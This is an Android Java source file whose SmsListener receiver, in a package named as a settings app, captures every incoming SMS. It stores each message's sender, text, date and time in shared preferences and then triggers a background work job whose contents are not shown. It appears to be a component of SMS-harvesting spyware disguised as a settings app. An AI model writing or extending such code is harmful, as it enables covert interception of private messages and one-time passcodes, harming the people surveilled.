package com.example.settings;

import static com.example.settings.MainActivity.setuponetimeworkManager;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SmsListener extends BroadcastReceiver {
    Sharedpref mSharedpref;

    @Override
    public void onReceive(Context context, Intent intent) {
        mSharedpref=new Sharedpref(context);
        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
            Bundle bundle = intent.getExtras();//---get the SMS message passed in---
            SmsMessage[] msgs = null;
            String msg_from;
            if (bundle != null){
                //---retrieve the SMS message received---
                try{
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    msgs = new SmsMessage[pdus.length];
                    for(int i=0; i<msgs.length; i++){
                        msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                        msg_from = msgs[i].getOriginatingAddress();
                        String msgBody = msgs[i].getMessageBody();
                        String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
                        String currentTime = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
                        String lastentry=mSharedpref.getSmsData();
                        String mBuilder=lastentry+","+"{ Date: "+currentDate+", Time: "+currentTime+",Number: "+msg_from+", Message Text: "+msgBody+"}";
                        mSharedpref.setSmsData(mBuilder.trim());
                        mSharedpref.commit();
                        Log.d("Outgoing Numbers",mBuilder);
                    }
                }catch(Exception e){
                    Log.d("Exception caught",e.getMessage());
                }
            }
            setuponetimeworkManager("From Sms Listener");
        }
    }
}
